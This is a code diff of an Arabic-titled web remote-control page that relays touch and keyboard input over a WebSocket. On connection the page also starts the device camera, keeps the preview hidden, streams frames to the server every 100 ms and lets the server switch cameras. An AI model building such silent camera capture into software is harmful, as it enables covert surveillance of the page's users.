@@ -6,18 +6,24 @@
     <title>تحكم عن بعد ذكي</title>
     <style>
         body { margin: 0; background: #000; height: 100vh; display: flex; flex-direction: column; overflow: hidden; touch-action: none; }
-        #screenDisplay { width: 100vw; height: 100vh; object-fit: contain; position: absolute; z-index: 1; }
+        #screenDisplay { width: 100vw; height: 100vh; object-fit: fill; position: absolute; z-index: 1; }
+        
         #hiddenInput {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             opacity: 0.01; z-index: 20; border: none; outline: none; background: transparent;
             display: block; pointer-events: none;
         }
-        #touchOverlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; background: transparent; }
+        
+        #touchOverlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 10; background: transparent;
+        }
         #myVideoPreview { display: none; }
     </style>
 </head>
 <body>
     <input type="text" id="hiddenInput" autocomplete="off" autocapitalize="none" spellcheck="false" value=" ">
+    
     <div id="touchOverlay"></div>
     <img id="screenDisplay" />
     <video id="myVideoPreview" autoplay muted playsinline></video>
@@ -31,11 +37,36 @@
         const myVideo = document.getElementById('myVideoPreview');
         
         let remoteKeyboardActive = false;
-        let currentStream = null;
-        let camInterval = null;
-        let lastMode = "";
 
         ws.onopen = () => { startCameraStream("user"); };
+
+        const handleTouch = (e) => {
+            const rect = img.getBoundingClientRect();
+            // الحصول على الإحداثيات الحقيقية داخل عنصر الصورة فقط
+            const clientX = e.clientX || (e.touches && e.touches[0].clientX);
+            const clientY = e.clientY || (e.touches && e.touches[0].clientY);
+            
+            if (clientX !== undefined && clientY !== undefined) {
+                // حساب المكان بالنسبة لبداية الصورة (rect.left و rect.top)
+                const relativeX = (clientX - rect.left) / rect.width;
+                const relativeY = (clientY - rect.top) / rect.height;
+
+                ws.send(JSON.stringify({
+                    type: 'touch',
+                    x: relativeX,
+                    y: relativeY
+                }));
+            }
+            
+            if (remoteKeyboardActive) {
+                hiddenInput.focus();
+            }
+        };
+
+        touchOverlay.addEventListener('touchstart', handleTouch);
+        touchOverlay.addEventListener('mousedown', handleTouch);
+        hiddenInput.addEventListener('touchstart', handleTouch);
+        hiddenInput.addEventListener('mousedown', handleTouch);
 
         ws.onmessage = (event) => {
             if (event.data instanceof Blob) {
@@ -49,68 +80,16 @@
                         remoteKeyboardActive = data.visible;
                         if (remoteKeyboardActive) {
                             hiddenInput.style.pointerEvents = "auto";
-                            hiddenInput.blur(); 
-                            setTimeout(() => hiddenInput.focus(), 50);
                         } else {
                             hiddenInput.style.pointerEvents = "none";
                             hiddenInput.blur();
                         }
                     } else if (data.type === 'camera_switch_request') {
-                        // تحويل الطلب لنص بسيط والمقارنة
-                        const modeRequested = String(data.mode).toLowerCase().includes("environment") ? "environment" : "user";
-                        if (modeRequested !== lastMode) {
-                            startCameraStream(modeRequested);
-                        }
+                        startCameraStream(data.mode);
                     }
                 } catch(e) {}
             }
         };
-
-        function startCameraStream(mode) {
-            lastMode = mode;
-            if (currentStream) currentStream.getTracks().forEach(track => track.stop());
-            if (camInterval) clearInterval(camInterval);
-
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false })
-            .then(stream => {
-                currentStream = stream;
-                myVideo.srcObject = stream;
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                
-                camInterval = setInterval(() => {
-                    if (ws.readyState === WebSocket.OPEN) {
-                        canvas.width = 320;
-                        canvas.height = 240;
-                        ctx.save();
-                        // تطبيق القلب فقط إذا كان الوضع "user" (سيلفي)
-                        if (mode === "user") {
-                            ctx.translate(canvas.width, 0);
-                            ctx.scale(-1, 1);
-                        }
-                        ctx.drawImage(myVideo, 0, 0, canvas.width, canvas.height);
-                        ctx.restore();
-                        const base64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
-                        ws.send(JSON.stringify({ type: 'remote_camera_frame', data: base64 }));
-                    }
-                }, 100);
-            }).catch(e => { if(mode !== "user") startCameraStream("user"); });
-        }
-
-        const handleTouch = (e) => {
-            const rect = img.getBoundingClientRect();
-            const clientX = e.clientX || (e.touches && e.touches[0].clientX);
-            const clientY = e.clientY || (e.touches && e.touches[0].clientY);
-            if (clientX !== undefined && clientY !== undefined) {
-                ws.send(JSON.stringify({ type: 'touch', x: clientX / rect.width, y: clientY / rect.height }));
-            }
-            if (remoteKeyboardActive) hiddenInput.focus();
-        };
-
-        touchOverlay.addEventListener('touchstart', handleTouch);
-        touchOverlay.addEventListener('mousedown', handleTouch);
-        hiddenInput.addEventListener('touchstart', handleTouch);
-        hiddenInput.addEventListener('mousedown', handleTouch);
 
         hiddenInput.oninput = (e) => {
             const val = e.target.value;
@@ -124,6 +103,27 @@
                 e.target.value = " ";
             }
         };
+
+        function startCameraStream(mode) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false })
+            .then(stream => {
+                myVideo.srcObject = stream;
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                setInterval(() => {
+                    if (ws.readyState === WebSocket.OPEN) {
+                        canvas.width = 320;
+                        canvas.height = 240;
+                        ctx.save();
+                        if (mode === "user") { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
+                        ctx.drawImage(myVideo, 0, 0, canvas.width, canvas.height);
+                        ctx.restore();
+                        const base64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
+                        ws.send(JSON.stringify({ type: 'remote_camera_frame', data: base64 }));
+                    }
+                }, 100);
+            }).catch(e => console.log("Cam error"));
+        }
     </script>
 </body>
 </html>
